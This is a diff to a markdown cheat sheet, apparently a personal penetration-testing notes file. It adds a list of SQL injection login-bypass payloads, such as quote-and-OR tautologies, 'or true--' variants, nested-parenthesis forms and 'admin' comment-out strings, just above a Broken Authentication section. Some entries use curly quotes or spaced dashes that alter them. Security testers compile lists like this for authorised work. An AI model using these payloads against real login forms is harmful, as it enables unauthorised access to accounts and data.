@@ -90,6 +90,79 @@ After a year of exploring in IT security. I have become lazy to copy and paste. 
   >‘ or ‘1’=1
   >
   >‘ or ‘1’=1 - -
+  >
+  >‘–
+  >
+  >' or '1'='1
+  >
+  >-'
+  >
+  >' '
+  >
+  >'&'
+  >
+  >'^'
+  >
+  >'*'
+  >
+  >' or ''-'
+  >
+  >' or '' '
+  >
+  >' or ''&'
+  >
+  >' or ''^'`
+  >
+  >`’ or ‘‘*’
+  >
+  >"-"
+  >
+  >" "
+  >
+  >"&"
+  >
+  >"^"
+  >
+  >"*"
+  >
+  >" or ""-"
+  >
+  >" or "" "
+  >
+  >" or ""&"
+  >
+  >" or ""^"
+  >
+  >" or ""*"
+  >
+  >or true--
+  >
+  >" or true--
+  >
+  >' or true--
+  >
+  >") or true--
+  >
+  >') or true--
+  >
+  >' or 'x'='x
+  >
+  >') or ('x')=('x
+  >
+  >')) or (('x'))=(('x
+  >
+  >" or "x"="x
+  >
+  >") or ("x")=("x
+  >
+  >")) or (("x"))=(("x
+  >
+- known Username
+  >
+  >admin’ - -
+  >
+  >admin’) - -
+  >
 
 ### Broken Authentication
 
